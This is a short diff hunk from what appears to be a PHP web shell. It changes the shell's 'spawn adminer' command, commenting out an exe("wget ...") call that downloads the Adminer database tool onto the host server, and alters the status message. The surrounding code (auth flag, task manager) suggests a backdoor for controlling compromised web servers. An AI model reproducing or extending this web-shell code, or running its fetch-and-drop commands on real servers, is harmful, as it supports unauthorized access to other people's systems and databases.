@@ -2090,8 +2090,8 @@ if($s_auth){
 
 	// spawn adminer
 	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='adminer')){
-        	exe("wget https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php -O adminer.php");
-		$s_result .= "Adminer Spawned | Access: <a href='".cp(dirname(realpath($_SERVER['SCRIPT_FILENAME'])))."'>Access</a>";
+        	//exe("wget https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php -O adminer.php");
+		$s_result .= "Adminer Spawned | Access: ".$s_cwd;
 	}
 	
 	// task manager
